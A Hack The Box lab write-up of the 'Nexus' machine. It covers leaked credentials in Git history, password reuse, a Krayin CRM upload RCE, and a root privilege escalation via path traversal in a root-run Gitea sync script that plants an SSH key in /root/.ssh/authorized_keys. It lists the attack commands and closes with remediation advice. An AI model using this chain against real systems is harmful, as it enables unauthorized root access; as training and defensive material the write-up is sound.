Completed Attack Chain

Executive Summary

Nexus was a Linux-based Hack The Box machine exposing SSH and HTTP. Initial enumeration identified a public-facing Nexus Energy Authority website, a billing application, and a self-hosted Gitea instance. The main attack chain began with virtual host discovery, followed by enumeration of the Gitea web application. A public repository contained a Krayin CRM Docker setup with an exposed .env file. Although the current .env no longer contained a database password, review of a previous commit revealed a reused password.

The recovered password allowed authenticated access to the Krayin CRM billing portal as j.matthew@nexus.htb. After logging in, the application was identified as Krayin CRM 2.2.0, which was vulnerable to an authenticated unrestricted file upload leading to remote code execution. Exploitation provided a reverse shell as www-data.

Post-exploitation enumeration of the Krayin application directory revealed another .env file containing database credentials. Password reuse allowed SSH access as the local user jones, which led to the user flag. Privilege escalation was achieved by identifying a root-owned systemd timer that executed a custom Gitea template synchronization script every minute. The script processed Gitea template repositories and wrote files based on Git tree paths without properly sanitizing path traversal. By creating a malicious Gitea template repository and pushing a crafted Git tree, an SSH public key was written to /root/.ssh/authorized_keys, allowing SSH access as root.

Sudo Enumeration

Sudo version 1.9.15p5

Systemd Timer Discovery

Systemd timers were reviewed as part of standard Linux privilege escalation enumeration:

systemctl list-timers

A custom timer related to Gitea template synchronization was identified. The timer and service configuration showed that the task executed every minute as root:

systemctl cat gitea-template-sync.timer
systemctl cat gitea-template-sync.service
# /etc/systemd/system/gitea-template-sync.timer
[Unit]
Description=Run Gitea template sync every minute

[Timer]
OnBootSec=1min
OnUnitActiveSec=1min
Unit=gitea-template-sync.service

[Install]
WantedBy=timers.target

# /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s

This was highly suspicious because a custom Python script was being executed as root on a recurring schedule.

Vulnerable Script Analysis

The script /etc/gitea/template-sync.py searched Gitea for repositories marked as templates, read each template repository's Git tree, and wrote blob contents into a staging directory.

Important configuration values:

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

The vulnerable behavior occurred when the script joined a Git-controlled file path to the staging path without validating or normalizing the final destination:

target = os.path.join(stage_path, filepath)
target_dir = os.path.dirname(target)

os.makedirs(target_dir, exist_ok=True)

with open(target, 'wb') as f:
    f.write(cat_result.stdout)

Because filepath came directly from the Git tree, a malicious repository could include traversal components such as ../. Since the script ran as root, this created an arbitrary file write primitive as root.

Exploitation Strategy

The objective was to write an SSH public key into root's authorized keys file:

/root/.ssh/authorized_keys

The attack flow was:

  1. Generate an SSH key pair on the attacking machine.
  2. Log into Gitea as jones.
  3. Create a repository marked as a template repository.
  4. Push a crafted Git tree containing a path traversal entry.
  5. Wait for the root-owned timer to process the template repository.
  6. SSH into the target as root using the private key.

SSH Key Generation

On the attacking machine:

ssh-keygen -t ed25519 -f /tmp/.nexus_root -N ''

The public key was saved as:

/tmp/.nexus_root.pub

Template Repository Creation

A Gitea repository was created as jones:

jones/template_repo

The repository was marked as a template repository so that it would be processed by the root-owned sync script.

The repository was cloned locally:

cd /tmp
git clone http://git.nexus.htb/jones/template_repo.git
cd template_repo

A normal commit was pushed first to confirm write access:

echo "# Template Repo" > README.md
git add README.md
git commit -m "initial commit"
git push -u origin main

The template sync log confirmed that the root timer processed the repository:

cat /var/log/template-sync.log
Syncing template: jones/template_repo
synced: README.md

Malicious Git Tree Creation

A script was used to construct a Git tree containing traversal entries that resolved to /root/.ssh/authorized_keys. The blob content was the attacker's SSH public key.

The malicious tree was pushed to the Gitea repository:

python3 build.py
git push -f origin main

After the timer executed, the root-run script processed the malicious template repository and wrote the public key into root's SSH authorized keys file.

Root Access

Root SSH access was obtained using the generated private key:

ssh -i /tmp/.nexus_root root@nexus.htb

Successful authentication resulted in a root shell:

root@nexus:~#

Root-level access was confirmed by reading /root/root.txt. The flag value is redacted in this public report.

Phase 8: Lessons Learned

1. Source Control History Matters

The current .env file did not contain a database password, but repository history did. Sensitive data committed to Git remains recoverable unless it is properly purged from history. Simply deleting a secret in a later commit is not sufficient.

2. Password Reuse Expands Impact

The password recovered from the Gitea repository allowed access to Krayin CRM. A separate password found in the application .env file allowed SSH access as jones. Reusing credentials across services allowed the attack to move from web application access to local system access.

3. Authenticated Vulnerabilities Are Still Critical

The Krayin CRM issue required authentication, but the exposed credentials made exploitation possible. Authenticated vulnerabilities should not be considered low risk when credential leakage exists elsewhere in the environment.

4. Systemd Timers Are Important Privilege Escalation Targets

Custom timers and services often reveal scripts that run automatically as privileged users. In this case, the systemd service clearly showed that /etc/gitea/template-sync.py executed as root every minute.

5. Never Trust File Paths from User-Controlled Sources

The privilege escalation worked because the root-owned script trusted file paths from a Git repository. Before writing files, scripts should normalize paths, reject traversal sequences, and verify that the final resolved path remains inside the intended directory.

Remediation Recommendations

Remove Secrets from Git History

Sensitive values such as database passwords, API keys, and application secrets should never be committed to repositories. Any exposed secrets should be rotated immediately, and Git history should be rewritten to remove the leaked values.

Enforce Unique Credentials

Each service account and user account should use unique credentials. Password reuse between applications, databases, and SSH accounts should be prohibited.

Patch or Mitigate Krayin CRM

The Krayin CRM instance should be upgraded to a fixed version. File upload functionality should enforce strict validation, including file extension restrictions, MIME validation, storage outside the web root, and server-side execution prevention.

Harden File Upload Handling

Uploaded files should not be directly executable by the web server. Public upload directories should be configured to block PHP execution.

Secure Root-Executed Automation

The Gitea template sync script should not process attacker-controlled paths as root. If privileged automation is required, it should run with the least privileges necessary and should validate all file paths before writing.

Recommended safe path handling:

target = os.path.realpath(os.path.join(stage_path, filepath))
safe_base = os.path.realpath(stage_path)

if not target.startswith(safe_base + os.sep):
    raise ValueError("Path traversal attempt blocked")

Review Custom systemd Services and Timers

Administrators should periodically review custom systemd timers and services for unsafe execution contexts, weak permissions, and unsafe scripts.

Conclusion

Nexus demonstrated a realistic multi-stage compromise involving web enumeration, source control leakage, credential reuse, authenticated remote code execution, local enumeration, and unsafe privileged automation. The most important lesson from this machine is that low-effort configuration mistakes, such as exposed repository history and reused passwords, can combine with application vulnerabilities and unsafe automation to produce full system compromise.
